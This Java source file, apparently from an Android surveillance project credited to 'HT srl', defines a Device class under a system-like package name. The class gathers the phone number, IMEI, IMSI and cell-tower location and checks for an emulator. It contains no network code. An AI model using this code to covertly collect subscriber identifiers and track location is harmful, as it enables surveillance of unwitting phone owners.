/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 06-dec-2010
 **********************************************/
package com.android.service;

import android.content.Context;
import android.provider.Settings.Secure;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;

import com.android.service.auto.Cfg;
import com.android.service.util.Check;
import com.android.service.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Device.
 */
public class Device {
	private static final String TAG = "Device";
	
	/** The singleton. */
	private volatile static Device singleton;

	/**
	 * Self.
	 * 
	 * @return the device
	 */
	public static Device self() {
		if (singleton == null) {
			synchronized (Device.class) {
				if (singleton == null) {
					singleton = new Device();
				}
			}
		}

		return singleton;
	}

	/**
	 * Gets the phone number.
	 * 
	 * @return the phone number
	 */
	public String getPhoneNumber() {
		TelephonyManager mTelephonyMgr;

		mTelephonyMgr = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
		
		String number = mTelephonyMgr.getLine1Number();
		
		if (number == null || number.length() == 0) {
			number = "Unknown";
		}
	
		return number;
	}
	
	/**
	 * Gets the version.
	 * 
	 * @return the version
	 */
	public byte[] getVersion() {
		final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
		if(Cfg.DEBUG) Check.ensures(versionRet.length == 4, "Wrong version len");
		return versionRet;
	}

	/**
	 * Checks if is CDMA.
	 *
	 * @return true, if is CDMA
	 */
	public static boolean isCdma() {
		return false;
	}
	
	public static boolean isGprs() {
		return true;
	}
	
	public boolean isSimulator(){
		//return getDeviceId() == "9774d56d682e549c";
		return android.os.Build.MODEL.endsWith("sdk");
	}

	/**
	 * Gets the imei.
	 *
	 * @return the imei
	 */
	public String getImei() {
		final TelephonyManager telephonyManager = (TelephonyManager) Status
				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);

		String imei = telephonyManager.getDeviceId();
		
	

		if (imei == null || imei.length() == 0) {
			imei = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
			if (imei == null || imei.length() == 0) {
				imei = "N/A";
			}
		}

		return imei;
	}

	/**
	 * Gets the imsi.
	 *
	 * @return the imsi
	 */
	public String getImsi() {
		final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext()
			.getSystemService(Context.TELEPHONY_SERVICE);
		
		String imsi = telephonyManager.getSubscriberId();
		
		if (imsi == null) {
			imsi = "UNAVAILABLE";
		}
		
		return imsi;
	}
	
	public static CellInfo getCellInfo(){

		
		android.content.res.Configuration conf = Status.getAppContext()
				.getResources().getConfiguration();
		TelephonyManager tm = (TelephonyManager) Status.getAppContext()
				.getSystemService(Context.TELEPHONY_SERVICE);
		
		
		CellInfo info = new CellInfo();

		
		CellLocation bcell = tm.getCellLocation();

		if (bcell == null) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: " + "null cell");
			return info;
		}

		int rssi = 0; //TODO aggiungere RSSI
		
		if (bcell instanceof GsmCellLocation) {
			if(Cfg.DEBUG) Check.asserts(Device.isGprs(), "gprs or not?");
			GsmCellLocation cell = (GsmCellLocation) bcell;
			
			info.setGsm(conf.mcc, conf.mnc, cell.getLac(), cell.getCid(), rssi);

			if(Cfg.DEBUG) Check.log( TAG + " info: " + info.toString());

		}

		if (bcell instanceof CdmaCellLocation) {
			if(Cfg.DEBUG) Check.asserts(Device.isCdma(), "cdma or not?");
			CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();
			
			info.setCdma(cell.getSystemId(),cell.getNetworkId(), cell.getBaseStationId(), rssi);
			info.cdma = true;
			info.valid = true;

			info.sid = cell.getSystemId();
			info.nid  = cell.getNetworkId();
			info.bid = cell.getBaseStationId();
						
			if(Cfg.DEBUG) Check.log( TAG + " info: " + info.toString());

		}
		
		return info;
	}

}